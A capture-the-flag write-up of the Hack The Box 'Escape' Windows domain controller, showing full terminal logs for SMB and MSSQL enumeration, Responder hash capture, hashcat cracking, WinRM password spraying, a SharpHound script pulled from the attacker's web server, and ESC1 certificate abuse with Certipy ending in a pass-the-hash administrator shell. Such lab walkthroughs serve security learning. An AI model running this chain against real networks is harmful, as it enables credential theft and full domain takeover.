# Escape

![image.png](https://github.com/het-desai/hackthebox/blob/main/escape/screenshots/image.png)

## Introduction

The Escape machine presents a Windows Active Directory environment exposing services like Kerberos, SMB, and MSSQL. Initial access was gained by exploiting an exposed MSSQL service using Impacket’s mssqlclient.py alongside LLMNR poisoning with Responder to extract NetNTLMv2 hashes. After cracking credentials with Hashcat, access via WinRM was achieved using Evil-WinRM. Enumeration with SharpHound and Certipy revealed an ESC1 vulnerability in AD CS, allowing certificate-based impersonation of the domain administrator.

## Machine Enumeration

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ nmap -Pn -sC -sV 10.10.11.202 -oN nmapInit.txt 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 14:35 EDT
Nmap scan report for 10.10.11.202
Host is up (0.016s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-18 02:35:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-04-18T02:36:47+00:00; +8h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-18T02:36:47+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-04-18T02:36:47+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-04-18T02:29:39
|_Not valid after:  2055-04-18T02:29:39
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-04-18T02:36:47+00:00; +8h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-04-18T02:36:47+00:00; +8h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time: 
|   date: 2025-04-18T02:36:08
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.69 seconds
```

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ tail /etc/hosts -n 1                                          
10.10.11.202	sequel.htb dc.sequel.htb
```

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ crackmapexec smb 10.10.11.202 -u 'DoesNotExist' -p '' --shares
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\DoesNotExist: 
SMB         10.10.11.202    445    DC               [+] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
```

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ smbclient \\\\10.10.11.202\\IPC$                           
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> exit
                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Escape]
└─$ smbclient \\\\10.10.11.202\\Public
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

		5184255 blocks of size 4096. 1438890 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (246.9 KiloBytes/sec) (average 246.9 KiloBytes/sec)
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

		5184255 blocks of size 4096. 1438890 blocks available
```

![image.png](https://github.com/het-desai/hackthebox/blob/main/escape/screenshots/image1.png)

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ impacket-mssqlclient 'sequel.htb/PublicUser':'GuestUserCantWrite1'@'10.10.11.202'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> EXECUTE sp_configure 'show advanced options', 1;
ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
SQL (PublicUser  guest@master)>
```

Successfully loggedin MS-Sql but didn’t find anything interesting yet. I checked usernames, databases, msdb (Database) > syspolicy_conditions (table) found vied XML data.

```
---Terminal 1---
┌──(kali㉿kali)-[~/htb/Escape]
└─$ sudo responder -I tun0 -dw

---Terminal 2 (MS-SQL Database)---
impacket-mssqlclient 'sequel.htb/PublicUser':'GuestUserCantWrite1'@'10.10.11.202'

```

![image.png](https://github.com/het-desai/hackthebox/blob/main/escape/screenshots/image2.png)

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ cat sqlsvchash.txt 
sql_svc::sequel:033b72717741d04e:24788606C7CAA25D09A1BA689920EB55:0101000000000000806AF29FB4AFDB0147057766BBCDC8790000000002000800520045004900340001001E00570049004E002D004C004D004C00530047004E004E00520037005000470004003400570049004E002D004C004D004C00530047004E004E0052003700500047002E0052004500490034002E004C004F00430041004C000300140052004500490034002E004C004F00430041004C000500140052004500490034002E004C004F00430041004C0007000800806AF29FB4AFDB0106000400020000000800300030000000000000000000000000300000527CC7FB770BAD45129721F9885E261CB336B51B60EB8F4A865B785A1564854D0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0036000000000000000000
```

![image.png](https://github.com/het-desai/hackthebox/blob/main/escape/screenshots/image3.png)

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ hashcat -m 5600 sqlsvchash.txt ~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt --force 
hashcat (v6.2.6) starting
...
...
...
SQL_SVC::sequel:033...00:REGGIE1234ronnie
...
...
...
```

Revisit the LLMNR topic from TCM course.

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ impacket-mssqlclient 'sequel.htb/sql_svc':'REGGIE1234ronnie'@'10.10.11.202'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC\SQLMOCK): Line 1: Login failed for user 'sql_svc'.
```

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie' --shares
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
SMB         10.10.11.202    445    DC               [+] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL          READ            Logon server share
```

I checked new SMB shared access `NETLOGON` and `SYSVOL` using smbclient tool and give some info about password policies and some SIDs. 

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ crackmapexec winrm 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'          
SMB         10.10.11.202    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

## Initial Foothold

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'  

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
*Evil-WinRM* PS C:\Users\sql_svc\Documents> hostname
dc
*Evil-WinRM* PS C:\Users\sql_svc\Documents> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::21c
   IPv6 Address. . . . . . . . . . . : dead:beef::31e4:c4d2:961c:34a0
   Link-local IPv6 Address . . . . . : fe80::31e4:c4d2:961c:34a0%4
   IPv4 Address. . . . . . . . . . . : 10.10.11.202
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:92a6%4
                                       10.10.10.2
```

```
---Kali Terminal 1---
┌──(kali㉿kali)-[~/tools/windows]
└─$ python3 -m http.server 80                                                                                                               
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.202 - - [23/Apr/2025 06:11:02] "GET /SharpHound.ps1 HTTP/1.1" 200 -

---Kali Terminal 2---
PS C:\Users\sql_svc\Videos> iwr -uri http://10.10.16.8/SharpHound.ps1 -OutFile SharpHound.ps1
iwr -uri http://10.10.16.8/SharpHound.ps1 -OutFile SharpHound.ps1
PS C:\Users\sql_svc\Videos> dir
dir

    Directory: C:\Users\sql_svc\Videos

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/23/2025  11:07 AM           7168 met5.exe                                                              
-a----        4/23/2025  11:11 AM        1308348 SharpHound.ps1
```

```
PS C:\Users\sql_svc\Videos> Import-Module ./SharpHound.ps1
Import-Module ./SharpHound.ps1
PS C:\Users\sql_svc\Videos> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\sql_svc\Videos\
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\sql_svc\Videos\
2025-04-23T11:12:07.0142089-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2025-04-23T11:12:07.1392372-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-04-23T11:12:07.1548345-07:00|INFORMATION|Initializing SharpHound at 11:12 AM on 4/23/2025
2025-04-23T11:12:07.3110838-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for sequel.htb : dc.sequel.htb
2025-04-23T11:12:07.3423281-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-04-23T11:12:07.4517643-07:00|INFORMATION|Beginning LDAP search for sequel.htb
2025-04-23T11:12:07.4829585-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-04-23T11:12:07.4829585-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-04-23T11:12:38.3735894-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 96 MB RAM
2025-04-23T11:12:57.3579470-07:00|INFORMATION|Consumers finished, closing output channel
2025-04-23T11:12:57.3891968-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2025-04-23T11:12:57.4985737-07:00|INFORMATION|Status: 97 objects finished (+97 1.94)/s -- Using 101 MB RAM
2025-04-23T11:12:57.4985737-07:00|INFORMATION|Enumeration finished in 00:00:50.0533483
2025-04-23T11:12:57.5610693-07:00|INFORMATION|Saving cache with stats: 56 ID to type mappings.
 56 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-04-23T11:12:57.5766974-07:00|INFORMATION|SharpHound Enumeration Completed at 11:12 AM on 4/23/2025! Happy Graphing!
```

Didn’t find anything in bloodhound map yet.

```
PS C:\SQLServer\Logs> type ERRORLOG.BAK
...
...
...
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
...
...
...
```

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ crackmapexec winrm 10.10.11.202 -u usernames.txt -p passwords.txt --continue-on-success
SMB         10.10.11.202    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\PublicUser:GuestUserCantWrite1
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\PublicUser:REGGIE1234ronnie
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\PublicUser:NuclearMosquito3
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\brandon:GuestUserCantWrite1
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\brandon:REGGIE1234ronnie
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\brandon:NuclearMosquito3
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\ryan:GuestUserCantWrite1
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\ryan:REGGIE1234ronnie
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\ryan:NuclearMosquito3
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\tom:GuestUserCantWrite1
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\tom:REGGIE1234ronnie
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\tom:NuclearMosquito3
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\Ryan.Cooper:GuestUserCantWrite1
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\Ryan.Cooper:REGGIE1234ronnie
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\James.Roberts:GuestUserCantWrite1
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\James.Roberts:REGGIE1234ronnie
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\James.Roberts:NuclearMosquito3
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\Brandon.Brown:GuestUserCantWrite1
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\Brandon.Brown:REGGIE1234ronnie
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\Brandon.Brown:NuclearMosquito3
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\Nicole.Thompson:GuestUserCantWrite1
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\Nicole.Thompson:REGGIE1234ronnie
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\Nicole.Thompson:NuclearMosquito3
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\Tom.Henn:GuestUserCantWrite1
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\Tom.Henn:REGGIE1234ronnie
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\Tom.Henn:NuclearMosquito3
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\sql_svc:GuestUserCantWrite1
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\sql_svc:NuclearMosquito3
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\krbtgt:GuestUserCantWrite1
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\krbtgt:REGGIE1234ronnie
WINRM       10.10.11.202    5985   DC               [-] sequel.htb\krbtgt:NuclearMosquito3
```

## Privilege Escalation

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> hostname
dc
```

Revisit the bloodhound and found a another user privilege escalation by “WriteOwner” permission to the Ryan user.

![image.png](https://github.com/het-desai/hackthebox/blob/main/escape/screenshots/image4.png)

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ certipy-ad find -vulnerable -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.10.11.202
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC-CA'
[*] Saved BloodHound data to '20250424121114_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250424121114_Certipy.txt'
[*] Saved JSON output to '20250424121114_Certipy.json'
```

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ cat 20250424121114_Certipy.json
...
...
...
"[!] Vulnerabilities": {
        "ESC1": "'SEQUEL.HTB\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication"
      }
...
...
...
```

Quick google search and in the 2nd page I found the below blog for exploit `ESC1 AD` .

![image.png](https://github.com/het-desai/hackthebox/blob/main/escape/screenshots/image5.png)

https://redfoxsec.com/blog/exploiting-misconfigured-active-directory-certificate-template-esc1/

![image.png](https://github.com/het-desai/hackthebox/blob/main/escape/screenshots/image6.png)

Here I used similar tool `certipy-ad` instead of `certipy` .

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ certipy-ad req -dc-ip 10.10.11.202 -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -ca sequel-DC-CA -target DC.sequel.htb -template UserAuthentication -upn administrator@sequel.htb -ns 10.10.11.202
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 15
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.202 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Quick google search about `SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`

![image.png](https://github.com/het-desai/hackthebox/blob/main/escape/screenshots/image7.png)

https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069

![image.png](https://github.com/het-desai/hackthebox/blob/main/escape/screenshots/image8.png)

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ su
Password: 
┌──(root㉿kali)-[/home/kali/htb/Escape]
└─# timedatectl set-ntp off
                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali/htb/Escape]
└─# rdate -n 10.10.11.202
Command 'rdate' not found, but can be installed with:
apt install rdate
Do you want to install it? (N/y)y
apt install rdate
Installing:                     
  rdate

Summary:
  Upgrading: 0, Installing: 1, Removing: 0, Not Upgrading: 43
  Download size: 17.3 kB
  Space needed: 49.2 kB / 38.3 GB available

Get:1 http://mirror.vinehost.net/kali kali-rolling/main amd64 rdate amd64 1:1.11-3 [17.3 kB]
Fetched 17.3 kB in 1s (27.7 kB/s)
Selecting previously unselected package rdate.
(Reading database ... 470195 files and directories currently installed.)
Preparing to unpack .../rdate_1%3a1.11-3_amd64.deb ...
Unpacking rdate (1:1.11-3) ...
Setting up rdate (1:1.11-3) ...
Processing triggers for man-db (2.13.0-1) ...
Processing triggers for kali-menu (2025.1.1) ...
                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali/htb/Escape]
└─# rdate -n 10.10.11.202
Thu Apr 24 20:28:26 EDT 2025
                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali/htb/Escape]
└─# exit
```

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.202
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

```
┌──(kali㉿kali)-[~/htb/Escape]
└─$ evil-winrm -i 10.10.11.202 -u 'administrator' -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
dc
```